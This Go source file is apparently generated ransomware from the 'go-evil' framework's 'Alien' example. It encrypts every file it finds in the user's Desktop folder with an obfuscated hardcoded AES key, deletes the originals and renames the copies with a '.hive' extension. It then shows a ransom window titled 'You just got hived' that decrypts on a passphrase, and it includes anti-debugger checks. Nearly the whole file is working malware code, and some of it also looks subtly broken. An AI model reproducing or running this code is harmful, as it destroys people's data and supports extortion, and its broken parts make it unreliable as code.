package main
import (
"github.com/TeamPhoneix/go-evil/utility/tools"
"regexp"
"strings"
"crypto/rsa"
"golang.org/x/sys/windows"
"time"
"os"
"io/ioutil"
"fmt"
"github.com/s9rA16Bf4/notify_handler/go/notify"
"github.com/TeamPhoneix/go-evil/utility/structure"
"encoding/hex"
"crypto"
"crypto/aes"
"crypto/sha256"
"crypto/rand"
"github.com/webview/webview"
)
type var_t struct {
values  []string
foreach string
roof int
pointer int
}
type crypt_t struct {
method string
target []string
aes_key string
aes_key_length int
rsa_public rsa.PublicKey
rsa_private *rsa.PrivateKey
rsa_key_length int
target_extension bool
extension string
}
type alpha_t struct {
alphabet []string
}
type spine_t struct {
variable  var_t
crypt crypt_t
path string
alpha alpha_t
}
const (
GRAB_VAR = "(€([0-9]+)€)"
)
var spine spine_t
func (obj *var_t) set(value string) {
obj.values[obj.pointer] = value
obj.pointer++
if obj.pointer >= obj.roof {
obj.pointer = 0
}}
func (obj *var_t) get(line string) string {
regex := regexp.MustCompile(GRAB_VAR)
result := regex.FindAllStringSubmatch(line, -1)
toReturn := line
if len(result) > 0 {
i_number := tools.String_to_int(result[0][2])
if i_number != -1 {
if i_number > 0 && i_number < 5 {
toReturn = obj.values[i_number-1]
}else if i_number == 666 { toReturn = tools.Grab_username()
} else if i_number == 39 { toReturn = tools.Grab_CWD()
} else if i_number == 13 { toReturn = obj.foreach
} else { toReturn = "NULL" }
toReturn = strings.ReplaceAll(line, result[0][1], toReturn)
}}
return toReturn }
func (obj *crypt_t) set_crypto(value string) {
obj.method = value
}
func (obj *crypt_t) set_aes_key(value string) {
obj.aes_key = value
obj.aes_key_length = len(value)
}
func (obj *crypt_t) set_rsa_key(private_key *rsa.PrivateKey, key_length int) {
obj.rsa_private = private_key
obj.rsa_public = private_key.PublicKey
obj.rsa_key_length = key_length
}
func (obj *crypt_t) add_target(value string) {
obj.target = append(obj.target, value)
}
func (obj *alpha_t) construct_string(value []int) string {
to_return := ""
for _, number := range value{
to_return += obj.alphabet[number]
}
return to_return
}
func detect_debugger() bool {
toReturn := false
driver := windows.NewLazyDLL("kernel32.dll")
toReturn = driver.NewProc("IsDebuggerPresent")
return toReturn
}
func detect_debugger_time() bool {
toReturn := false
old := time.Now()
a := 1
b := 1
for i := 0; i < 100; i++ {
a = ((2 * i) % 2) + i + 20
b = a % (b * 3)
}
new := time.Now()
diff := new.Sub(old)
if diff.Seconds() > float64(tools.Generate_random_int()) {
toReturn = true
}
return toReturn
}
func stop_behavior() bool {
toReturn := false
toReturn = detect_debugger()
if toReturn {
os.Exit(42)
}
return toReturn
}
func clean_targets(){
spine.crypt.target = []string{}
}
func set_extension(repr []int){
target := spine.alpha.construct_string(repr)
spine.crypt.extension = target
}
func set_aes_key(repr []int){
key := spine.alpha.construct_string(repr)
spine.crypt.set_aes_key(key)
}
func set_crypto(repr []int){
target := spine.alpha.construct_string(repr)
spine.crypt.set_crypto(target)
}
func list_dir(config []string){
if len(config) < 2{
notify.Error("The provided evil array does not contain all required values", "system.list_dir()")
}
obj_type := spine.variable.get(config[0])
path := spine.variable.get(config[1])
result, err := ioutil.ReadDir(path)
if err == nil{
evil_array := "${"
for _, file := range result{
if obj_type == "file" && !file.IsDir() || obj_type == "dir" && file.IsDir() || obj_type == "" {
evil_array += fmt.Sprintf("\"%s/%s\",", path, file.Name())
}
}
evil_array += "}$"
spine.variable.set(evil_array)
}}
func add_target(repr []int){
target := spine.alpha.construct_string(repr)
target = spine.variable.get(target)
if target != ""{
spine.crypt.add_target(target)
}
}
func foreach(values []string){
for i, value := range values{
value = spine.variable.get(value)
arr := structure.Create_evil_object(value)
if arr.Length() > 0 {
result := arr.Dump()
values[i] = result[0]
values = append(values, result[1:]...)
}}
for _, value := range values{
spine.variable.foreach = value
add_target([]int{65,1,3,65,})
}}
func decrypt(){
if spine.crypt.method == "" || len(spine.crypt.target) == 0 || (spine.crypt.aes_key_length == 0 && spine.crypt.rsa_key_length == 0) {
notify.Error("Method, target or/and key has not been set for decryption", "runtime.Error()")
}
for _, target := range spine.crypt.target{
target = spine.variable.get(target)
gut, err := ioutil.ReadFile(target)
if err != nil{
notify.Error(err.Error(), "Decrypt.Error()")
return
}
dec := ""
switch (spine.crypt.method){
	case "aes":
cipher, err := aes.NewCipher([]byte(spine.crypt.aes_key))
if err != nil{
notify.Error(err.Error(), "Decrypt.Error()")
}
cipher_text, err := hex.DecodeString(string(gut[:]))
if err != nil{
notify.Error(err.Error(), "Decrypt.Error()")
}
buffer := make([]byte, len(cipher_text))
cipher.Decrypt(buffer, []byte(cipher_text))
dec = string(buffer[:])
	case "rsa":
buffer, err := hex.DecodeString(string(gut[:]))
if err != nil{
notify.Error(err.Error(), "Decrypt.Error()")
}
buffer, err = spine.crypt.rsa_private.Decrypt(nil, buffer, &rsa.OAEPOptions{Hash: crypto.SHA256})
if err != nil{
notify.Error(err.Error(), "Decrypt.Error()")
}
dec = string(buffer[:])
}
if spine.crypt.extension == ""{
spine.crypt.extension = ".decrypted"
}
ioutil.WriteFile(fmt.Sprintf("%s%s", target, spine.crypt.extension), []byte(dec), 0644)
}
}
func decrypt_files(){
clean_targets()
set_extension([]int{75,12,21,14,10,27,14,13,})
set_aes_key([]int{17,18,31,14,59,59,59,59,59,59,59,59,59,59,59,59,})
set_crypto([]int{10,14,28,})
list_dir([]string{"file","C:\\Documents and Settings\\€666€\\Desktop",})
foreach([]string{"€2€"})
decrypt()
}
func encrypt(){
if spine.crypt.method == "" || len(spine.crypt.target) == 0 || (spine.crypt.aes_key_length == 0 && spine.crypt.rsa_key_length == 0) {
notify.Error("Method, target or/and key has not been set for encryption", "runtime.Error()")
}
for _, target := range spine.crypt.target{
target = spine.variable.get(target)
gut, err := ioutil.ReadFile(target)
if err != nil{
notify.Error(err.Error(), "Encrypt.Error()")
return
}
enc := ""
switch (spine.crypt.method){
	case "aes":
cipher, err := aes.NewCipher([]byte(spine.crypt.aes_key))
if err != nil{
notify.Error(err.Error(), "Encrypt.Error()")
}
for (len(gut) < spine.crypt.aes_key_length){
gut = append(gut, []byte("X")...)
}
buffer := make([]byte, len(gut))
cipher.Encrypt(buffer, gut)
enc = hex.EncodeToString(buffer)
	case "rsa":
enc_byte, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, &spine.crypt.rsa_public, []byte(gut), nil)
if err != nil{
notify.Error(err.Error(), "Encrypt.Error()")
}
enc = hex.EncodeToString(enc_byte)
}
if spine.crypt.extension == ""{
spine.crypt.extension = ".encrypted"
}
ioutil.WriteFile(fmt.Sprintf("%s%s", target, spine.crypt.extension), []byte(enc), 0644)
os.Remove(target)
}
}
func encrypt_files(){
set_extension([]int{75,17,18,31,14,})
set_aes_key([]int{17,18,31,14,59,59,59,59,59,59,59,59,59,59,59,59,})
set_crypto([]int{10,14,28,})
list_dir([]string{"file","C:\\Documents and Settings\\€666€\\Desktop",})
foreach([]string{"€1€"})
encrypt()
}
func Run()(){
w := webview.New(false)
defer w.Destroy()
w.SetHtml(`
	<head>
		<style>body{ background-image:url('https://raw.githubusercontent.com/TeamPhoneix/go-evil/v2/examples/ransomware/Alien/background.jpg'); background-repeat: no-repeat;  background-size: cover; background-position: center center; }
label{color: #555;}
#input_box {position: absolute; bottom: 0; left: 50%; background-color: #DBF9FC;}</style>
		<script>function checking() { var input = document.getElementById('in').value; if (input === 'hive'){decrypt(); window.alert('Successfully decrypted files')}else{window.alert('Enter hive into the text box')}}</script>
	</head>
	<body>
	<div id='input_box'>
<label for='in'>Input</label>
<input id='in' type='input'>
<input type='submit' onclick='checking()'>
</div>
	</body>
	`)
w.SetSize(934, 580, webview.HintNone)
w.SetTitle("You just got hived")
w.Bind("decrypt", decrypt_files)

w.Run()
}
func Exit(lvl string){
lvl = spine.variable.get(lvl)
value := tools.String_to_int(lvl)
os.Exit(value)
}
func webview_run(){
Run()
Exit("0")
}
func main(){
spine.alpha.alphabet = []string{"0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "!", "#", "$", "€", "%", "&", "\"", "(", ")", "*", "+", ",", "-", ".", "/", ":", ";", "<", "=", ">", "?", "@", "[", "\\", "]", "^", "_", "`", "{", "|", "}", "~", " ", "\t", "\n", "\r", "\x0b", "\x0c"}
spine.variable.roof = 5
spine.variable.pointer = 0
spine.variable.values = make([]string, spine.variable.roof)
spine.variable.values[0] = ""
spine.variable.values[1] = ""
spine.variable.values[2] = ""
spine.variable.values[3] = ""
spine.variable.values[4] = ""
spine.path = tools.Grab_executable_path()
encrypt_files()
for !stop_behavior() && !detect_debugger_time() {
webview_run()
}}
